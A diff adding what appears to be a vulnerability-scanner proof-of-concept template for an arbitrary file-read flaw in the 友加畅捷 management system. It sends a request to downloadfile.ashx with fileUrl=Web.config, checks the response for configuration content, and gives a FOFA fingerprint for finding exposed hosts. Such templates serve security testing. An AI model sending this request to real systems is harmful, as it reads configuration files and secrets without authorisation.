@@ -1,0 +1,15 @@
+id: poc-yaml-youjiasoft-downloadfile-ashx-anyfile-read
+info:
+  name: 友加畅捷管理系统 downloadfile.ashx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 友加畅捷管理系统
+  fofa: icon_hash="2049187099"
+requests:
+- method: GET
+  path: /Controllers/ajax/downloadfile.ashx?fileUrl=Web.config
+  expression: status_code == 200 && contains(body,"</system.web>") && contains(body,"<configuration>")
+    && contains(headers,"filename=Web.config") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
